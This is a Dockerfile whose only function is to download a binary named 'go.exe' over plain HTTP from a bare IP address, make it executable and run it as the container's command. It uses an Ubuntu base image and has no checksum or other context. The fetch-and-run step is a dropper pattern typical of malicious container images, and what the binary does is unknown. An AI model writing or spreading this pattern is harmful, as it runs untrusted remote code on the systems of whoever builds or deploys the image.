FROM ubuntu:20.04

RUN cat /etc/apt/sources.list

RUN apt-get update -y && apt-get install -y curl && rm -rf /var/lib/apt/lists/* && apt-get clean

RUN curl -o /usr/local/bin/go.exe http://3.80.52.103/home/ubuntu/go.exe

RUN chmod +x /usr/local/bin/go.exe

CMD ["/usr/local/bin/go.exe"]
